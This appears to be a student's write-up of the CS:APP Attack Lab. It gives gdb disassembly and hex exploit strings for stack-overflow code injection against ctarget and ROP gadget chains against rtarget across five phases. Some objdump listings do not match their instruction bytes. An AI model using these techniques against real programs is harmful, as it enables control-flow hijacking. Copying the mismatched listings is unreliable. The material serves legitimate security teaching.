# `getbuf`

```assembly
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017ca <+0>:     sub    $0x18,%rsp
   0x00000000004017ce <+4>:     mov    %rsp,%rdi
   0x00000000004017d1 <+7>:     call   0x401a0a <Gets>
   0x00000000004017d6 <+12>:    mov    $0x1,%eax
   0x00000000004017db <+17>:    add    $0x18,%rsp
   0x00000000004017df <+21>:    ret
End of assembler dump.
```

```assembly
(gdb) b getbuf
(gdb) r
(gdb) si
(gdb) i r esp
esp            0x55674408       1432831008
```

## Cookie

```text
Cookie(string): 0xXXXXXXXX
Cookie(ASCII Hexadecimal): XX XX XX XX XX XX XX XX
```

## CTarget

### Phase 1 / Level 1 / touch1

```assembly
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017e0 <+0>:     sub    $0x8,%rsp
   0x00000000004017e4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044fc <vlevel>
   0x00000000004017ee <+14>:    mov    $0x402f50,%edi
   0x00000000004017f3 <+19>:    call   0x400c50 <puts@plt>
   0x00000000004017f8 <+24>:    mov    $0x1,%edi
   0x00000000004017fd <+29>:    call   0x401bf9 <validate>
   0x0000000000401802 <+34>:    mov    $0x0,%edi
   0x0000000000401807 <+39>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

```assembly
# ctarget.l1.txt

9f 9f 9f 9f 9f 9f 9f 9f # padding 1 (0x00~0x07)
9f 9f 9f 9f 9f 9f 9f 9f # padding 2 (0x08~0x0F)
9f 9f 9f 9f 9f 9f 9f 9f # padding 3 (0x10~0x17)
e0 17 40 00 00 00 00 00 # address of touch1
```

### Phase 2 / Level 2 / touch2

```assembly
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x000000000040180c <+0>:     sub    $0x8,%rsp
   0x0000000000401810 <+4>:     mov    %edi,%esi
   0x0000000000401812 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044fc <vlevel>
   0x000000000040181c <+16>:    cmp    0x202ce2(%rip),%edi        # 0x604504 <cookie>
   0x0000000000401822 <+22>:    jne    0x40183f <touch2+51>
   0x0000000000401824 <+24>:    mov    $0x402f78,%edi
   0x0000000000401829 <+29>:    mov    $0x0,%eax
   0x000000000040182e <+34>:    call   0x400c80 <printf@plt>
   0x0000000000401833 <+39>:    mov    $0x2,%edi
   0x0000000000401838 <+44>:    call   0x401bf9 <validate>
   0x000000000040183d <+49>:    jmp    0x401858 <touch2+76>
   0x000000000040183f <+51>:    mov    $0x402fa0,%edi
   0x0000000000401844 <+56>:    mov    $0x0,%eax
   0x0000000000401849 <+61>:    call   0x400c80 <printf@plt>
   0x000000000040184e <+66>:    mov    $0x2,%edi
   0x0000000000401853 <+71>:    call   0x401cab <fail>
   0x0000000000401858 <+76>:    mov    $0x0,%edi
   0x000000000040185d <+81>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

```assembly
movq $0xXXXXXXXX,%rdi     # Cookie value
pushq $0x40180c           # touch2
retq
```

```shell
unix> cat asm.s

movq $0xXXXXXXXX,%rdi     # Cookie value
pushq $0x40180c           # touch2
retq

unix> gcc -c asm.s

unix> objdump -d asm.o

asm.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 XX XX XX XX    mov    $0x1ea510b7,%rdi
   7:   68 0c 18 40 00          pushq  $0x40180c
   c:   c3                      retq
```

```assembly
# ctarget.l2.txt

48 c7 c7 XX XX XX XX 68 # attack asm
0c 18 40 00 c3 9f 9f 9f # attack asm, padding (0x0d~0x0f)
9f 9f 9f 9f 9f 9f 9f 9f # padding (0x10~0x17)
08 44 67 55 00 00 00 00 # address of attack string
```

### Phase 3 / Level 3 / touch3

```assembly
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018e0 <+0>:     push   %rbx
   0x00000000004018e1 <+1>:     mov    %rdi,%rbx
   0x00000000004018e4 <+4>:     movl   $0x3,0x202c0e(%rip)        # 0x6044fc <vlevel>
   0x00000000004018ee <+14>:    mov    %rdi,%rsi
   0x00000000004018f1 <+17>:    mov    0x202c0d(%rip),%edi        # 0x604504 <cookie>
   0x00000000004018f7 <+23>:    call   0x401862 <hexmatch>
   0x00000000004018fc <+28>:    test   %eax,%eax
   0x00000000004018fe <+30>:    je     0x40191e <touch3+62>
   0x0000000000401900 <+32>:    mov    %rbx,%rsi
   0x0000000000401903 <+35>:    mov    $0x402fc8,%edi
   0x0000000000401908 <+40>:    mov    $0x0,%eax
   0x000000000040190d <+45>:    call   0x400c80 <printf@plt>
   0x0000000000401912 <+50>:    mov    $0x3,%edi
   0x0000000000401917 <+55>:    call   0x401bf9 <validate>
   0x000000000040191c <+60>:    jmp    0x40193a <touch3+90>
   0x000000000040191e <+62>:    mov    %rbx,%rsi
   0x0000000000401921 <+65>:    mov    $0x402ff0,%edi
   0x0000000000401926 <+70>:    mov    $0x0,%eax
   0x000000000040192b <+75>:    call   0x400c80 <printf@plt>
   0x0000000000401930 <+80>:    mov    $0x3,%edi
   0x0000000000401935 <+85>:    call   0x401cab <fail>
   0x000000000040193a <+90>:    mov    $0x0,%edi
   0x000000000040193f <+95>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

```assembly
movq $0x55674428,%rdi     # adress of cookie string
pushq $0x4018e0           # touch3
retq
```

```shell
unix> cat asm.s

movq $0x55674428,%rdi     # adress of cookie string
pushq $0x4018e0           # touch3
retq

unix> objdump -d asm.o

asm.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 28 44 67 55    mov    $0x55674440,%rdi
   7:   68 e0 18 40 00          pushq  $0x4018e0
   c:   c3                      retq
```

```assembly
# ctarget.l3.txt

48 c7 c7 28 44 67 55 68 # attack asm
e0 18 40 00 c3 9f 9f 9f # attack asm, padding (0x0d~0x0f)
9f 9f 9f 9f 9f 9f 9f 9f # padding (0x10~0x17)
08 44 67 55 00 00 00 00 # address of attack string
XX XX XX XX XX XX XX XX # ASCII hexadecimal Cookie
```

## RTarget

### Phase 4 / Level 2 / touch2

```assembly
(1) popq %rax ; retq 0x401976
0000000000401974 <setval_144>:
  401974:       c7 07 "58 c3" 3b 5d       movl   $0x5d3bc358,(%rdi)
  40197a:       c3                      retq
(2) popq %rax ; retq 0x401987
0000000000401982 <addval_493>:
  401982:       8d 87 7c e0 73 "58       lea    0x5873e07c(%rdi),%eax
  401988:       c3"                      retq
(3) movq %rax, %rdi ; retq 0x40197d
000000000040197b <setval_123>:
  40197b:       c7 07 "48 89 c7 c3"       movl   $0xc3c78948,(%rdi)
  401981:       c3                      retq
(4) movq %rax, %rdi ; retq 0x40198b
0000000000401989 <addval_177>:
  401989:       8d 87 "48 89 c7 c3"       lea    -0x3c3876b8(%rdi),%eax
  40198f:       c3                      retq
```

```assembly
# in ctarget
movq $0xXXXXXXXX,%rdi     # Cookie value
pushq $0x40180c           # touch2
retq

# in rtarget
popq %rax ; retq
movq %rax, %rdi ; retq
```

```text
(0x18 length padding)
(address of popq %rax ; retq)
(cookie value)
(address of movq %rax, %rdi ; retq)
(address of touch2)
```

```assembly
# rtarget.l2.txt

9f 9f 9f 9f 9f 9f 9f 9f # padding 1 (0x00~0x07)
9f 9f 9f 9f 9f 9f 9f 9f # padding 2 (0x08~0x0F)
9f 9f 9f 9f 9f 9f 9f 9f # padding 3 (0x10~0x17)
76 19 40 00 00 00 00 00 # popq %rax ; retq
XX XX XX XX XX XX XX XX # cookie
7d 19 40 00 00 00 00 00 # movq %rax, %rdi ; retq
0c 18 40 00 00 00 00 00 # address of touch2
```

### Phase 5 / Level 3 / touch3

```assembly
00000000004019aa <add_xy>:
  4019aa:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019ae:       c3                      retq
```

```text
(0x18 length padding)
(address of popq %rax)
(offset)
(address of movl %eax, %ecx)
(address of movl %ecx, %edx)
(address of movl %edx, %esi)
(address of movq %rsp, %rax)
(address of movq %rax, %rdi)
(address of add_xy)
(address of movq %rax, %rdi)
(address of touch3)
(cookie string)
```

```assembly
(1) popq %rax ; retq 0x401976
0000000000401974 <setval_144>:
  401974:       c7 07 "58 c3" 3b 5d       movl   $0x5d3bc358,(%rdi)
  40197a:       c3                      retq
(2) popq %rax ; retq 0x401987
0000000000401982 <addval_493>:
  401982:       8d 87 7c e0 73 "58       lea    0x5873e07c(%rdi),%eax
  401988:       c3"                     retq
(3) movl %eax, %ecx ; retq 0x401a69
0000000000401a68 <getval_163>:
  401a68:       b8 "89 c1 c3" 7f          mov    $0x7fc3c189,%eax
  401a6d:       c3                      retq
(4) movl %ecx, %edx ; nop ; retq 0x4019b7
00000000004019b5 <addval_260>:
  4019b5:       8d 87 "89 ca 08 c0       lea    -0x3ff73577(%rdi),%eax
  4019bb:       c3"                      retq
(5) movl %ecx, %edx ; nop ; retq 0x401a7d
0000000000401a7b <setval_450>:
  401a7b:       c7 07 "89 ca 08 d2       movl   $0xd208ca89,(%rdi)
  401a81:       c3"                      retq
(6) movl %edx, %esi ; nop ; retq 0x401a07
0000000000401a05 <setval_108>:
  401a05:       c7 07 "89 d6 20 c0       movl   $0xc020d689,(%rdi)
  401a0b:       c3"                      retq
(7) movq %rsp, %rax ; retq 0x4019d2
00000000004019d0 <setval_430>:
  4019d0:       c7 07 "48 89 e0 c3"       movl   $0xc3e08948,(%rdi)
  4019d6:       c3                      retq
(8) movq %rsp, %rax ; retq 0x401a3d
0000000000401a3b <addval_384>:
  401a3b:       8d 87 "48 89 e0 c3"       lea    -0x3c1f76b8(%rdi),%eax
  401a41:       c3                      retq
(9) movq %rax, %rdi ; retq 0x40197d
000000000040197b <setval_123>:
  40197b:       c7 07 "48 89 c7 c3"       movl   $0xc3c78948,(%rdi)
  401981:       c3                      retq
(10) movq %rax, %rdi ; retq 0x40198b
0000000000401989 <addval_177>:
  401989:       8d 87 "48 89 c7 c3"       lea    -0x3c3876b8(%rdi),%eax
  40198f:       c3                      retq
```

```assembly
# rtarget.l3.txt

9f 9f 9f 9f 9f 9f 9f 9f # padding 1 (0x00~0x07)
9f 9f 9f 9f 9f 9f 9f 9f # padding 2 (0x08~0x0F)
9f 9f 9f 9f 9f 9f 9f 9f # padding 3 (0x10~0x17)
76 19 40 00 00 00 00 00 # popq %rax ; retq v
20 00 00 00 00 00 00 00 # offset v
69 1a 40 00 00 00 00 00 # movl %eax, %ecx ; retq v
b7 19 40 00 00 00 00 00 # movl %ecx, %edx ; nop ; retq v
07 1a 40 00 00 00 00 00 # movl %edx, %esi ; nop ; retq v
d2 19 40 00 00 00 00 00 # movq %rsp, %rax ; retq v
7d 19 40 00 00 00 00 00 # movq %rax, %rdi ; retq v
aa 19 40 00 00 00 00 00 # address of add_xy v
7d 19 40 00 00 00 00 00 # movq %rax, %rdi ; retq v
e0 18 40 00 00 00 00 00 # address of touch3 v
XX XX XX XX XX XX XX XX # ASCII hexadecimal Cookie v
```
